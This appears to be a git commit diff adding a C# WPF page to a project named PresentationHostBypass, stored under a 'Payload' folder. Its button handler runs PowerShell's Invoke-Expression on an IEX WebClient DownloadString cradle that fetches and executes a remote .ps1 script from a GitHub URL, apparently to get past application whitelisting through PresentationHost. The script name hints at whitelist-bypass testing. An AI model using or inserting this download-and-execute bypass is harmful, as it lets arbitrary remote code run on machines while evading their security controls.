950a2636c0dfe9975368147b3f87c0effed3d0c5
NotSurprised <roro8016489@gmail.com>
2020-03-25 21:17:41 +0800

    20200325

---
+++ Payload/PresentationHostBypass/PresentationHostBypass/Page1.xaml.cs
@@ -0,0 +1,38 @@
+﻿using System;
+using System.IO;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Windows;
+using System.Windows.Controls;
+using System.Windows.Data;
+using System.Windows.Documents;
+using System.Windows.Input;
+using System.Windows.Media;
+using System.Windows.Media.Imaging;
+using System.Windows.Navigation;
+using System.Windows.Shapes;
+using System.Management.Automation;
+
+namespace PresentationHostBypass
+{
+    /// <summary>
+    /// Page1.xaml 的互動邏輯
+    /// </summary>
+    public partial class Page1 : Page
+    {
+        public Page1()
+        {
+            InitializeComponent();
+            MessageBox.Show("PresentationHostBypass.");
+        }
+        private void Button_Click(object sender, RoutedEventArgs e)
+        {
+            PowerShell ps = PowerShell.Create();
+            ps.AddCommand("Invoke-Expression");
+            ps.AddArgument("IEX (New-Object Net.WebClient).DownloadString('https://github.com/NotSurprised/LoremIpsumDolorSitAmetconsEctetur/raw/master/Payload/WhiteListTestScript.ps1')");
+            MessageBox.Show("PresentationHostExecuteBypass.");
+        }
+    }
+}
